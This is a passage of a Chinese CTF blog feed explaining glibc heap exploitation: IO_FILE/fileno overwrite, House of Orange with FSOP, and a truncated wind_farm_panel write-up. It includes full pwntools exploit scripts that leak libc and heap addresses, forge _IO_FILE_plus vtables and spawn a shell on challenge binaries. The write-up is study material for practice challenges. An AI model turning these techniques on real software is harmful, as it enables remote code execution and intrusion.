class="number">0x91</span>)</span><br></pre></td></tr></table></figure><p>多次释放 chunk0 最后放入 unsortedbin 泄露 libc 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="comment"># double free chunk0 into unsortedbin </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>修改 stdin 的 fileno 为 666 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write tcache fd </span></span><br><span class="line">add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of sprit</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">heap_base = show(<span class="number">1</span>) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">231</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br></pre></td></tr></table></figure><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(binary=<span class="string">&quot;./ciscn_final_2&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_final_2&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_final_2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">type</span>, num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">heap_base = show(<span class="number">2</span>)-<span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of spirt</span></span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># overwrite chunk0 size to 0x91</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="comment"># double free chunk0 into unsortedbin </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">stdin_fileno = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x70</span></span><br><span class="line">log.info(<span class="string">&quot;stdin_fileno:&quot;</span>+<span class="built_in">hex</span>(stdin_fileno))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># write tcache fd </span></span><br><span class="line">add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of sprit</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">heap_base = show(<span class="number">1</span>) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">231</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/Mira_Hu/article/details/103736917">IO_FILE:2018 HCTF the_end</a></li><li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.13_io_file.html">4.13 利用 _IO_FILE 结构</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file">IO_FILE Related</a></li><li><a href="https://xz.aliyun.com/t/6567">IO file结构在pwn中的妙用</a></li><li><a href="https://bestwing.me/IO_FILE_Pwn.html">IO_FILE Pwn 利用整理</a></li></ul><hr><p>[^1]: 用 fwrite 等这种流 I/O 函数写入写出，数据会先放在缓冲区，并没有真正输入或者输出，需要用 fflush 冲洗流中信息才完成写入写出。避免用 fflush 冲洗就用 setbuf 函数关闭缓冲（pwn 题初始化必备）</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO-FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of orange</title>
      <link href="archives/625c64bd/"/>
      <url>archives/625c64bd/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://bbs.ichunqiu.com/thread-59550-1-1.html">https://bbs.ichunqiu.com/thread-59550-1-1.html</a></p></blockquote><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>house of orange 特殊之处是题目没有 free 函数等释放堆块函数。house of orange 核心思想通过漏洞实现 free 的效果。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能控制 topchunk size 位（堆溢出等）</li><li>能控制堆分配的大小</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当 topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，实现没有 free 函数释放堆块。</p><p>扩展堆空间有 <code>mmap</code> 和 <code>brk</code> 两种方式，我们需要以 <code>brk</code> 拓展，需要绕过 libc 一些 check ：<strong>malloc 申请大小不能大于 <code>mmp_.mmap_threshold</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>总结伪造 topchunk 要求：</p><ul><li><p>伪造 size 需要对齐内存页</p><p>比如现在 topchunk size 为：<code>0x20fa1</code>，那么对齐内存页的 size 可以为：0xfa1、0x1fa1……</p></li><li><p>size 要大于 MINSIZE</p></li><li><p>prev_inuse 为 1</p></li><li><p>size 要小于等等申请 chunk_size+MINISIZE （才能让 topchunk 放入 unsortedbin）</p></li></ul><p>自此得到一个 unsortedbin 堆，用来泄露 libc 地址，实现 FSOP</p><h3 id="hitcon-2016-houseoforange"><a href="#hitcon-2016-houseoforange" class="headerlink" title="hitcon_2016_houseoforange"></a>hitcon_2016_houseoforange</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>保护全开，实验环境在 Ubuntu16.04。</p><p>能自主控制分配堆大小，结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  *info;</span><br><span class="line">  chunk_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span>&#123;</span></span><br><span class="line">  price;</span><br><span class="line">  color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 edit 函数中存在堆溢出：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216230021.png" alt="image-20201216230021762"></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>利用堆溢出将 topchunk size 改小，size 要求看前文。修改前 topchunk 和 heap 范围：</p><p>![image-20201216231726321](../../../../../Library/Application Support/typora-user-images/image-20201216231726321.png)</p><p>修改后情况：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216231929.png" alt="image-20201216231929179"></p><p>之后申请一个大于 topchunk 的堆，topchunk 就被放入 unsortedbin ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555557580a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557580a0</span><br></pre></td></tr></table></figure><p>申请一个 largebin 用于泄露 libc 和 堆地址。用的 malloc 分配，libc 读取 bk 位置信息即可，分配的是 largebin 在 fd_nextsize 和 bk_nextsize 都存放堆地址分别读出即可。堆地址在 FSOP 伪造 vtable 需要用到。</p><p>自此后面就是 FSOP 利用。劫持在 libc 中的 _IO_list_all 内容，将其内容指向可控地址伪造 _IO_FILE_plus 和 vtabel 。默认状态下的 _IO_list_all 指向的是 _IO_2_1_stderr_ ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216232611.png" alt="image-20201216232610931"></p><p>利用堆溢出修改在 unsortedbin 的 topchunk fd bk 指针，发起 unsortedbin attack 劫持 _IO_list_all 。这里修改完 fd bk 之后申请一个堆，topchunk unlink 就会修改 _IO_list_all 指向到 main_arena+88 ，这个区域前后我们还是不能控制，就利用 _chain 标志位指向下一个文件流，这个标志位的位置刚好是 unsortedbin 0x60 链表位置。因此将 topchunk size 覆盖为 0x60 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216234838.png" alt="image-20201216234838174"></p><p>执行 _IO_flush_all_lockp 时逐个遍历文件流，遇到错误文件就跳过去处理 _chain 指向的下一个文件流，因此现在 topchunk 里面伪造一个 _IO_FILE_plus 结构体。</p><p>需要设置几个标志位绕过保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mode_offset=<span class="number">0x0</span>;</span><br><span class="line">writeptr_offset=<span class="number">0x1</span>;</span><br><span class="line">writebase_offset=<span class="number">0x0</span>;</span><br></pre></td></tr></table></figure><p>然后将 vtable 指针劫持会 topchunk 特定位置，让 __overflow 为 system ，文件流（topchunk）头部覆盖为 /bin/sh 作为参数传入。</p><p>成功结构体如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000607.png" alt="image-20201217000607071"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000644.png" alt="image-20201217000644542"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./houseoforange_hitcon_2016&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29595</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange_hitcon_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">command(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 &#x27;free&#x27; 2 bin</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line"><span class="comment">#0x555555758000     0x555555779000 rw-p    21000 0      [heap]</span></span><br><span class="line"><span class="comment">#0x555555758000     0x55555579b000 rw-p    43000 0      [heap]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 leak libc</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_addr = leak_addr-<span class="number">1640</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_addr:&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">IO_list_all=libc_addr+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;IO_list_all:&quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">system=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 leak heap</span></span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set fake struct</span></span><br><span class="line">payload=<span class="string">&#x27;d&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000ddaa00000003</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake += p64(heap_addr+<span class="number">0x558</span>) <span class="comment">#vtable</span></span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p64(system)</span><br><span class="line">payload += fake</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink attack</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ul><li><a href="https://www.cnblogs.com/shangye/p/6268981.html">ctf-HITCON-2016-houseoforange学习</a></li><li><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016（House of orange， unsorted bin attack，FSOP）</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1">house_of_orange</a></li></ul><h3 id="2020-纵横杯-wind-farm-panel"><a href="#2020-纵横杯-wind-farm-panel" class="headerlink" title="2020_纵横杯_wind_farm_panel"></a>2020_纵横杯_wind_farm_panel</h3><h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>十分明显的堆溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please modify your personal information.\nWhich turbine: &quot;</span>);</span><br><span class="line">  v3 = read_int(<span class="string">&quot;Please modify your personal information.\nWhich turbine: &quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;area + v3) || v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Unvalidated Input&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;area + v3), <span class="number">0x1000</span>uLL);   <span class="comment">// 堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>满足 <code>house_of_orange</code> 的条件：堆溢出能修改 topchunk size ；申请 size 限制范围大；没有 free 功能。</p><ol><li>溢出修改 topchunk size ，申请大于 topchunk 的堆，将 topchunk 放入 unsortedbin ，然后泄露 libc 地址</li><li>修复 chunk_size&amp;pre_size ，申请 larginbin 泄露 heap_addr</li><li>FSOP</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite topchunk size</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>))</span><br><span class="line"><span class="comment"># frow topchunk into unsortedbin</span></span><br><span 